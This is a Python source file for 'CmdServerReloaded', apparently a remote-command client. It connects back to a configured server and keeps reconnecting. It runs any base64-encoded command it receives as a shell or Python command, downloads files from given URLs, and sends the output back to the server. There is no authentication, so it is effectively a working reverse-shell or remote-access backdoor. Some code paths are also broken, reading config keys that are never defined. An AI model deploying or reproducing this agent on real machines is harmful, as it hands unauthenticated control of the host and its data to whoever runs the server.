import os
import json
import socket
import urllib.request
from threading import Thread
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
import time
import base64
import getpass
import tkinter.messagebox
import traceback

config_version="2"
def base64encode(string):
    return base64.b64encode(string.encode()).decode()


def base64decode(string):
    return base64.b64decode(string.encode()).decode()


# start_time = time.time()  # 起始运行时间

# 初始化服务器连接配置
if os.path.exists("config.json"):
    with open("config.json", "r") as config_file:
        config = json.load(config_file)
    if config["config-version"]!=config_version:
        input("配置文件版本不匹配，请删除重新生成")
        os._exit(0)
else:
    config = {
        "config-version": "2",
        "client-name": f"{socket.gethostname()}_{getpass.getuser()}",
        "server-address": "127.0.0.1",
        "server-port": "8631",
        "fallback-server-port": "8632",
        "startup-message": "False",
    }
    with open("config.json", "w") as config_file:
        json.dump(config, config_file)
if config["startup-message"] != "False":
    tkinter.messagebox.showinfo("CmdServerReloaded",f'ClientName: {config["client-name"]} | LocalHTTP: {config["local-port"]} | ConnectToServer: {config["server-address"]}')


# 内置状态显示HTTP服务器（弃用）
class Request(BaseHTTPRequestHandler):
    timeout = 5
    server_version = "Apache"
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        buf = f"""<title>CmdServerReloaded - Status</title>config.json {str(config)}
Version - {config["version"]}
HostName - {socket.gethostname()}
UserName - {getpass.getuser()}
HttpPort - {config["local-port"]}
ConnectServer - {config["server-address"]}
ConnectStatus - {False}
RunningTime - {time.time()}""".replace(
            "\n", "<br>"
        )
        self.wfile.write(buf.encode("gb2312"))


def start_http_server():
    HTTPServer(("localhost", int(config["local-port"])), Request).serve_forever()


# 远程操作函数
def e_download(url):
    urllib.request.urlretrieve(url, os.path.basename(url))


def e_message(text):
    tkinter.messagebox.showinfo("Message From Server", text)


def execute(mode, line):
    if mode == "cmd":
        p = subprocess.Popen(
            line,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        ).communicate()[0]
        try:
            return p.decode("gb2312")
        except:
            return p.decode("UTF-8")
    elif mode == "download":
        Thread(target=e_download, args=(line.replace("\r",""),)).start()
        return "Sended"
    elif mode == "python":
        p = subprocess.Popen(
            "python -c "+line,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        ).communicate()[0]
        try:
            return p.decode("gb2312")
        except:
            return p.decode("UTF-8")
    elif mode == "message":
        Thread(target=e_message, args=(line,)).start()
        return "Done"
    elif mode == "username":
        return config["client-name"]


def execute_and_fallbackdata(data):
    res = execute(data[0], base64decode(data[1]))
    s2 = socket.socket()
    s2.connect((config["server-address"], int(config["fallback-server-port"])))
    s2.send(f"""{data[2]}|{base64encode(res)}""".encode("UTF-8"))
    print(base64encode(res))
    s2.close()


def start_server_connection():
    while True:
        s = socket.socket()
        try:
            s.connect((config["server-address"], int(config["server-port"])))
        except:
            print(traceback.format_exc())
            continue
        while True:
            try:
                d = s.recv(2147483647).decode("UTF-8")
            except:
                print(traceback.format_exc())
                break
            print(d)
            data = d.split("|")
            Thread(target=execute_and_fallbackdata, args=(data,)).start()
        s.close()
        time.sleep(45)


if __name__ == "__main__":
    Thread(target=start_server_connection).start()
